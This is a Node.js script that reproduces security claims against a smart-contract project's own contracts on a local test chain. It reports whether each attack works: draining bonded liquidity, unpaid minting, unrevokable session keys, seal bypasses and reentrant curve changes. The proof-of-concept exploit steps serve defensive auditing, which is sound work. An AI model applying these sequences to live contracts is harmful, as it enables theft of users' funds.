#!/usr/bin/env node
/*───────────────────────────────────────────────────────────────────────────
  IPSEITY · reproducing what the adversary panel claimed

  Five adversary lenses were asked to attack this collection and returned
  nineteen sharpened strategies. A strategy is a claim, not a finding. This
  file tries to make each one actually happen against the real compiled
  contracts, and reports which reproduce.

  A claim that reproduces is a bug in this repository.
  A claim that does not is a bug in the claim, and is recorded as such,
  because a panel that is never wrong is a panel nobody checked.

    node tools/verify-findings.mjs
───────────────────────────────────────────────────────────────────────────*/
import { compile, artifact } from "./compile.mjs";
import { Chain, enc, decUint, decAddr, decBool, encodeAddressArg } from "./evm.mjs";
import { createAddressFromString, hexToBytes, bytesToHex } from "@ethereumjs/util";

const REPRO = [], SAFE = [];
const WAD = 10n ** 18n;
const REGISTRY = "0x000000006551c19487814612e58FE06813775758";
const FOREVER = 2n ** 40n;
const MAX = (1n << 256n) - 1n;
const head = (s) => console.log(`\n  \x1b[1m${s}\x1b[0m`);
const reproduced = (name, detail) => {
  REPRO.push({ name, detail });
  console.log(`  \x1b[31m● REPRODUCES\x1b[0m  ${name}\n      ${detail}`);
};
const refuted = (name, detail) => {
  SAFE.push({ name, detail });
  console.log(`  \x1b[32m○ refuted\x1b[0m     ${name}\n      \x1b[2m${detail}\x1b[0m`);
};

const evm = await import("./evm.mjs");
const out = compile({ quiet: true, dirs: ["src", "test/mocks"] });
const A = (f, n) => artifact(out, f, n);
const c = await Chain.open();
const me = c.from.toString();

const tmpReg = await c.deploy(A("test/mocks/ERC6551Registry.sol", "ERC6551Registry").bytecode);
await c.vm.stateManager.putCode(createAddressFromString(REGISTRY),
  await c.vm.stateManager.getCode(createAddressFromString(tmpReg)));

const acctImpl = await c.deploy(A("src/IpseityAccount.sol", "IpseityAccount").bytecode);
const gripImpl = await c.deploy(A("src/GripVault.sol", "GripVault").bytecode);
const engine = await c.deploy(A("src/Engine.sol", "Engine").bytecode, "0".repeat(64));
const sigil = await c.deploy(A("src/Sigil.sol", "Sigil").bytecode);
const renderer = await c.deploy(A("src/Renderer.sol", "Renderer").bytecode,
  encodeAddressArg(engine) + encodeAddressArg(sigil));
const nft = await c.deploy(A("src/Ipseity.sol", "Ipseity").bytecode,
  encodeAddressArg(renderer) + encodeAddressArg(acctImpl) + encodeAddressArg(gripImpl));

const CAP = 10n ** 27n;
const pool = await c.deploy(A("src/Pool.sol", "Pool").bytecode,
  encodeAddressArg(nft) + CAP.toString(16).padStart(64, "0") +
  encodeAddressArg(me) + "0".repeat(64));

const mock = A("test/mocks/MockERC20.sol", "MockERC20").bytecode;
const encStr = (s) => {
  const b = Buffer.from(s, "utf8");
  return b.length.toString(16).padStart(64, "0") + b.toString("hex").padEnd(64, "0");
};
const mkToken = async (name, sym) => {
  const nameEnc = encStr(name);
  return c.deploy(mock,
    (0xa0).toString(16).padStart(64, "0") +
    BigInt(0xa0 + nameEnc.length / 2).toString(16).padStart(64, "0") +
    (18).toString(16).padStart(64, "0") + "0".repeat(64) + "0".repeat(64) +
    nameEnc + encStr(sym));
};
const BASE = await mkToken("Base", "BASE");
const QUOTE = await mkToken("Quote", "QUOTE");
await c.exec(pool, "bless(address,bool)", [BASE, true]);
await c.exec(pool, "bless(address,bool)", [QUOTE, true]);

const bob = "0x" + "b0b".padStart(40, "0");
const asOf = async (who, to, sig, args = [], value = 0n) => {
  const r = await c.vm.evm.runCall({
    to: createAddressFromString(to), caller: createAddressFromString(who),
    origin: createAddressFromString(who), data: hexToBytes(enc(sig, args)),
    gasLimit: 60_000_000n, value, block: evm.BLOCK
  });
  if (r.execResult.exceptionError) {
    const e = new Error(r.execResult.exceptionError.error);
    e.data = bytesToHex(r.execResult.returnValue || new Uint8Array());
    throw e;
  }
  return bytesToHex(r.execResult.returnValue);
};
const bal = async (t, w) => decUint(await c.read(t, "balanceOf(address)", [w]));
const mkt = async (id) => {
  const raw = await c.read(pool, "marketOf(uint256)", [id]);
  return { rB: decUint(raw, 2), rQ: decUint(raw, 3), bond: decUint(raw, 6),
           vB: decUint(raw, 8), vQ: decUint(raw, 9) };
};
/* six 16-bit angles; planes 3,4,5 are the ones containing w */
const maxConcWord = (1n << 48n) * 32768n + (1n << 64n) * 32768n + (1n << 80n) * 32768n;

/*═══════════ CLAIM 1 — the bond can be drained through the curve ═══════════

  "deposit() has no _unbonded gate and DOES call _reanchor, so a bonded
   market's curve can still be re-shaped by its holder — and the holder can
   pull inventory out of a bonded market as trading profit."                */
head("claim 1 · a bonded market can be drained through its own curve");
{
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const id = decUint(await c.read(nft, "totalSupply()"));
  await c.exec(nft, "commit(uint256,uint256)", [id, maxConcWord]);
  await c.exec(BASE, "mint(address,uint256)", [me, 10n ** 8n * WAD]);
  await c.exec(QUOTE, "mint(address,uint256)", [me, 10n ** 8n * WAD]);
  await c.exec(BASE, "approve(address,uint256)", [pool, MAX]);
  await c.exec(QUOTE, "approve(address,uint256)", [pool, MAX]);
  await c.exec(pool, "openMarket(uint256,address,address,uint16)", [id, BASE, QUOTE, 30]);
  await c.exec(pool, "deposit(uint256,uint256,uint256)", [id, 1_000_000n * WAD, 1_000_000n * WAD]);
  await c.exec(pool, "bond(uint256,uint64)", [id, evm.GENESIS_TIME + 300n * 86400n]);

  const m0 = await mkt(id);
  console.log(`      bonded with ${m0.rB / WAD} / ${m0.rQ / WAD}, offsets ${m0.vB / WAD} / ${m0.vQ / WAD}`);

  // the four advertised doors are shut
  let anyDoor = false;
  for (const [n, f] of [
    ["withdraw", () => c.exec(pool, "withdraw(uint256,uint256,uint256,address)", [id, 1n, 1n, me])],
    ["closeMarket", () => c.exec(pool, "closeMarket(uint256)", [id])],
    ["setFee", () => c.exec(pool, "setFee(uint256,uint16)", [id, 100])],
    ["syncCurve", () => c.exec(pool, "syncCurve(uint256)", [id])]
  ]) { try { await f(); anyDoor = true; console.log(`      !! ${n} opened`); } catch {} }

  // does deposit re-anchor while bonded?
  await c.exec(BASE, "mint(address,uint256)", [bob, 10n ** 8n * WAD]);
  await c.exec(QUOTE, "mint(address,uint256)", [bob, 10n ** 8n * WAD]);
  await asOf(bob, BASE, "approve(address,uint256)", [pool, MAX]);
  await asOf(bob, QUOTE, "approve(address,uint256)", [pool, MAX]);

  const b0 = await bal(BASE, bob), q0 = await bal(QUOTE, bob);
  let cycles = 0;
  for (let i = 0; i < 6; i++) {
    const m = await mkt(id);
    const inAmt = m.rB / 3n;
    try {
      await asOf(bob, pool, "swap(uint256,bool,uint256,uint256,address,uint256)",
        [id, true, inAmt, 0, bob, FOREVER]);
      await c.exec(pool, "deposit(uint256,uint256,uint256)", [id, 1n, 0]);   // the lever
      const m2 = await mkt(id);
      await asOf(bob, pool, "swap(uint256,bool,uint256,uint256,address,uint256)",
        [id, false, m2.rQ / 3n, 0, bob, FOREVER]);
      cycles++;
    } catch (e) { break; }
  }
  const b1 = await bal(BASE, bob), q1 = await bal(QUOTE, bob);
  const m1 = await mkt(id);
  const gainedB = b1 - b0, gainedQ = q1 - q0;

  console.log(`      after ${cycles} cycles: reserves ${m1.rB / WAD} / ${m1.rQ / WAD}`);
  console.log(`      the accomplice is ${gainedB / WAD} base, ${gainedQ / WAD} quote`);

  if (gainedB > 0n && gainedQ > 0n) {
    reproduced("a bonded market can be drained through the curve",
      `an accomplice ended +${gainedB / WAD} base AND +${gainedQ / WAD} quote while bondUntil ` +
      `was live; reserves fell ${m0.rB / WAD}→${m1.rB / WAD} and ${m0.rQ / WAD}→${m1.rQ / WAD}`);
  } else if (m1.rB < m0.rB && m1.rQ < m0.rQ) {
    reproduced("a bond does not hold both reserves",
      `${m0.rB / WAD}/${m0.rQ / WAD} → ${m1.rB / WAD}/${m1.rQ / WAD} under a live bond`);
  } else {
    refuted("a bonded market can be drained through the curve",
      `the accomplice ended ${gainedB / WAD} base / ${gainedQ / WAD} quote — ` +
      `profit on both sides is what the claim needs and it did not happen`);
  }

  // the narrower claim: does deposit move a term while bonded?
  const before = await mkt(id);
  await c.exec(pool, "deposit(uint256,uint256,uint256)", [id, 1000n * WAD, 0]);
  const after = await mkt(id);
  if (after.vB !== before.vB || after.vQ !== before.vQ) {
    reproduced("deposit re-anchors the curve while bonded",
      `offsets moved (${before.vB},${before.vQ}) → (${after.vB},${after.vQ}) with bondUntil live, ` +
      `while syncCurve — the function that exists to move them — is refused`);
  } else {
    refuted("deposit re-anchors the curve while bonded", "the offsets did not move");
  }
}

/*═══════════ CLAIM 2 — free supply through cloneWithKernel ═══════════*/
head("claim 2 · the whole supply can be minted for free once a verifier exists");
{
  const verifier = await c.deploy(A("test/mocks/MockVerifier.sol", "MockVerifier").bytecode);
  await c.exec(nft, "setVerifier(address)", [verifier]);

  const paidBefore = (await c.vm.stateManager.getAccount(createAddressFromString(nft))).balance;
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const parent = decUint(await c.read(nft, "totalSupply()"));

  const H = "0x" + "11".repeat(32), KEY = "0x" + "22".repeat(32);
  await c.send({ to: nft, data: "0x" + evm.sel("sealKernel(uint256,bytes32[],bytes32)").slice(2) +
    parent.toString(16).padStart(64, "0") + (0x60).toString(16).padStart(64, "0") +
    KEY.slice(2) + (1).toString(16).padStart(64, "0") + H.slice(2) });

  const proof = "0x" + H.slice(2) + H.slice(2) + KEY.slice(2);
  const supply0 = decUint(await c.read(nft, "totalSupply()"));
  let minted = 0;
  for (let i = 0; i < 8; i++) {
    try {
      await c.exec(nft, "cloneWithKernel(address,uint256,bytes)", [me, parent, proof]);
      minted++;
    } catch (e) { break; }
  }
  const supply1 = decUint(await c.read(nft, "totalSupply()"));
  const paidAfter = (await c.vm.stateManager.getAccount(createAddressFromString(nft))).balance;

  console.log(`      supply ${supply0} → ${supply1}; the contract took ` +
              `${(paidAfter - paidBefore) / (10n ** 16n)} × the mint price for ${supply1 - supply0 + 1n} tokens`);

  if (minted > 0 && paidAfter === paidBefore + 10n ** 16n) {
    reproduced("cloneWithKernel issues supply without payment",
      `${minted} extra tokens were drawn from one paid mint, each of them immediately ` +
      `clonable in turn — nothing bounds how many times a paid token may be drawn from`);
  } else {
    refuted("cloneWithKernel issues supply without payment",
      minted === 0 ? "no clone succeeded" : "the contract was paid for each");
  }
}

/*═══════════ CLAIM 3 — a session key survives an ownership cycle ═══════════

  "OwnershipCycle is enforced only inside onlySigner, and executeAsSession
   never calls owner() — so a token transferred into its own Reach leaves
   the session live and unrevokable forever."                               */
head("claim 3 · a session key that nobody can ever revoke");
{
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const id = decUint(await c.read(nft, "totalSupply()"));
  const reach = decAddr(await c.read(nft, "account(uint256)", [id]));
  await c.exec(nft, "embody(uint256)", [id]);
  await c.exec(BASE, "mint(address,uint256)", [reach, 1_000n * WAD]);

  const keeper = "0x" + "e".repeat(40);
  const MAXU64 = (1n << 64n) - 1n;
  let forever = false;
  try {
    await c.exec(reach, "grantSession(address,uint64,uint128,address[],bytes4[])",
      [keeper, MAXU64, 0, [BASE], ["0xa9059cbb"]]);
    forever = true;
  } catch { /* a ceiling refused it */ }
  if (forever) {
    reproduced("a session may be granted an expiry nobody can outlive",
      `grantSession accepted expires=2^64-1 with no ceiling, while seal has MAX_SEAL=365d ` +
      `and bond has MAX_BOND=365d — the one time-promise here that does not cap`);
  } else {
    refuted("a session may be granted an expiry nobody can outlive",
      "grantSession refused 2^64-1; the expiry is capped like every other promise here");
    await c.exec(reach, "grantSession(address,uint64,uint128,address[],bytes4[])",
      [keeper, evm.GENESIS_TIME + 300n * 86400n, 0, [BASE], ["0xa9059cbb"]]);
  }

  // move the token into its own account
  let cycled = false;
  try {
    await c.exec(nft, "transferFrom(address,address,uint256)", [me, reach, id]);
    cycled = decAddr(await c.read(nft, "ownerOf(uint256)", [id])).toLowerCase() === reach.toLowerCase();
  } catch {}
  console.log(`      the token now owned by its own Reach: ${cycled}`);

  if (cycled) {
    let canRevoke = false;
    try { await c.exec(reach, "revokeSession(address)", [keeper]); canRevoke = true; } catch {}
    let sessionActs = false;
    try {
      await asOf(keeper, reach, "executeAsSession(address,uint256,bytes)",
        [BASE, 0, enc("transfer(address,uint256)", [bob, 1_000n * WAD])]);
      sessionActs = true;
    } catch (e) { console.log("      " + String(e.message).slice(0, 80)); }

    if (sessionActs && !canRevoke) {
      reproduced("a session key outlives every way of revoking it",
        `the token owns its own Reach, so every onlySigner path reverts OwnershipCycle — ` +
        `but executeAsSession never calls owner() and moved ${await bal(BASE, bob) / WAD} base out. ` +
        `Nobody can revoke it, ever.`);
    } else if (!sessionActs) {
      refuted("a session key outlives every way of revoking it",
        "executeAsSession also refused under the cycle");
    } else {
      refuted("a session key outlives every way of revoking it", "revokeSession still worked");
    }
  } else {
    refuted("a session key outlives every way of revoking it",
      "the token could not be moved into its own account");
  }
}

/*═══════════ CLAIM 4 — the MEASURED high bit collides ═══════════

  "_verify masks MEASURED off the pre value but compares it against a raw
   post value, so a token that sets bit 255 makes `now_ < pre` always
   false and the seal stops constraining that asset."                       */
head("claim 4 · a guarded token that sets bit 255 escapes the seal");
{
  const HIBIT = await c.deploy(A("test/mocks/HighBit.sol", "HighBit").bytecode);
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const id = decUint(await c.read(nft, "totalSupply()"));
  const reach = decAddr(await c.read(nft, "account(uint256)", [id]));
  await c.exec(nft, "embody(uint256)", [id]);
  await c.exec(HIBIT, "mint(address,uint256)", [reach, 1_000n * WAD]);
  await c.exec(reach, "guard(address)", [HIBIT]);
  await c.exec(reach, "seal(uint64)", [evm.GENESIS_TIME + 100n * 86400n]);

  const raw0 = decUint(await c.read(HIBIT, "rawBalance(address)", [reach]));
  await c.exec(HIBIT, "setTaint(bool)", [true]);
  let drained = false;
  try {
    await c.exec(reach, "execute(address,uint256,bytes,uint8)",
      [HIBIT, 0, enc("transfer(address,uint256)", [bob, 1_000n * WAD]), 0]);
    drained = true;
  } catch (e) { console.log("      " + String(e.message).slice(0, 90)); }
  const raw1 = decUint(await c.read(HIBIT, "rawBalance(address)", [reach]));

  if (drained && raw1 < raw0) {
    reproduced("a token setting bit 255 walks out of a sealed vault",
      `rawBalance ${raw0 / WAD} → ${raw1 / WAD} while sealedUntil was live. _verify compares ` +
      `a masked pre against an unmasked post, so (1<<255) < 1000e18 is false and Shrank never fires`);
  } else {
    refuted("a token setting bit 255 walks out of a sealed vault",
      drained ? "the call went through but nothing moved" : "the seal refused the call");
  }
}

/*═══════════ CLAIM 5 — blind at snapshot means exempt from the check ═══════*/
head("claim 5 · an asset unreadable at snapshot is exempt from its own drain");
{
  const WINK = await c.deploy(A("test/mocks/Winker.sol", "Winker").bytecode);
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const id = decUint(await c.read(nft, "totalSupply()"));
  const reach = decAddr(await c.read(nft, "account(uint256)", [id]));
  await c.exec(nft, "embody(uint256)", [id]);
  await c.exec(WINK, "mint(address,uint256)", [reach, 500n * WAD]);
  await c.exec(reach, "guard(address)", [WINK]);
  await c.exec(reach, "seal(uint64)", [evm.GENESIS_TIME + 100n * 86400n]);

  // control: while readable, the drain must be refused
  let control = false;
  try {
    await c.exec(reach, "execute(address,uint256,bytes,uint8)",
      [WINK, 0, enc("pull(address,uint256)", [bob, 100n * WAD]), 0]);
    control = true;
  } catch {}

  await c.exec(WINK, "pause()", []);
  const blind = decUint(await c.read(reach, "unmeasurable()"), 1);
  const raw0 = decUint(await c.read(WINK, "rawBalance(address)", [reach]));
  let slipped = false;
  try {
    await c.exec(reach, "execute(address,uint256,bytes,uint8)",
      [WINK, 0, enc("pull(address,uint256)", [bob, 500n * WAD]), 0]);
    slipped = true;
  } catch (e) { console.log("      " + String(e.message).slice(0, 90)); }
  const raw1 = decUint(await c.read(WINK, "rawBalance(address)", [reach]));

  console.log(`      unmeasurable() reported ${blind} asset(s) before the call`);
  if (!control && slipped && raw1 < raw0) {
    reproduced("blind at snapshot means exempt for the whole call",
      `the identical call is refused while the asset is readable and goes through while it is ` +
      `not — ${raw0 / WAD} → ${raw1 / WAD}. The call that empties it is also the call that ` +
      `restores its readability, and _verify skipped it on the pre[i]==0 rule`);
  } else {
    refuted("blind at snapshot means exempt for the whole call",
      control ? "the control drain also succeeded — the fixture is wrong"
              : slipped ? "the call went through but nothing moved" : "the seal refused it");
  }
}

/*═══════════ CLAIM 6 — reentrant syncCurve inside a swap ═══════════*/
head("claim 6 · a token hook re-anchors the curve inside somebody else's swap");
{
  const HOOK = await c.deploy(A("test/mocks/Hooked.sol", "Hooked").bytecode);
  await c.exec(pool, "bless(address,bool)", [HOOK, true]);
  await c.exec(nft, "mint()", [], { value: 10n ** 16n });
  const id = decUint(await c.read(nft, "totalSupply()"));
  await c.exec(nft, "commit(uint256,uint256)", [id, maxConcWord]);
  await c.exec(HOOK, "mint(address,uint256)", [me, 10n ** 8n * WAD]);
  await c.exec(HOOK, "approve(address,uint256)", [pool, MAX]);
  await c.exec(pool, "openMarket(uint256,address,address,uint16)", [id, HOOK, QUOTE, 30]);
  await c.exec(pool, "deposit(uint256,uint256,uint256)", [id, 500_000n * WAD, 500_000n * WAD]);

  await c.exec(HOOK, "mint(address,uint256)", [bob, 10n ** 6n * WAD]);
  await asOf(bob, HOOK, "approve(address,uint256)", [pool, MAX]);

  const q = decUint(await c.read(pool, "quote(uint256,bool,uint256)", [id, true, 100_000n * WAD]));
  // arm: during _pull, re-anchor to concentration zero
  await c.exec(HOOK, "arm(address,address,uint256)", [pool, nft, id]);

  const before = await mkt(id);
  let got = 0n, reverted = false;
  try {
    const r = await asOf(bob, pool, "swap(uint256,bool,uint256,uint256,address,uint256)",
      [id, true, 100_000n * WAD, 0, bob, FOREVER]);
    got = decUint(r);
  } catch (e) { reverted = true; console.log("      " + String(e.message).slice(0, 90)); }
  const after = await mkt(id);

  console.log(`      quoted ${q / WAD}, received ${got / WAD}`);
  console.log(`      offsets ${before.vB / WAD}/${before.vQ / WAD} → ${after.vB / WAD}/${after.vQ / WAD}`);

  if (!reverted && (before.vB !== after.vB || before.vQ !== after.vQ)) {
    reproduced("a trade moved the curve it was trading against",
      `the only Pool entry point in that transaction was swap(), and the anchored offsets ` +
      `changed across it — invariant 16b says a trade moves along the curve and never moves ` +
      `it. The trader received ${got / WAD} against a same-transaction quote of ${q / WAD}`);
  } else {
    refuted("a trade moved the curve it was trading against",
      reverted ? "the reentrant call reverted the swap" : "the offsets did not move");
  }
}

/*───────────────────────────────────────────────────────────────────────────*/
console.log("");
if (REPRO.length === 0) {
  console.log(`  \x1b[32mnone of the ${SAFE.length} claims reproduced\x1b[0m\n`);
  process.exit(0);
}
console.log(`  \x1b[31m${REPRO.length} of ${REPRO.length + SAFE.length} claims reproduced\x1b[0m`);
for (const r of REPRO) console.log(`    · ${r.name}`);
console.log("");
process.exit(1);
